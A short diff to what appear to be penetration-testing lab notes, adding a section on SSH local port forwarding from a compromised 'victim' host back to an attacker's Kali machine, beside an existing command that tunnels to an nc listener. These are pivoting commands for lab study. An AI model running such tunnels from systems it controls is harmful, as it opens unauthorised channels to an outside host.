@@ -192,3 +192,12 @@ Like the above command, we can do the same to create a tunnel for a nc listener
 C:\Users\web_svc>ssh -N -L 0.0.0.0:1234:192.168.45.186:4444 kali@192.168.45.186
 ```
 
+
+
+### Tunnel Internal Web Service
+
+Like we did above we can portforward an internal web service back to our kali host.
+
+```bash
+victim@ubuntu ssh -N -L local_port:remote_host:remote_port kali@192.168.45.186
+```
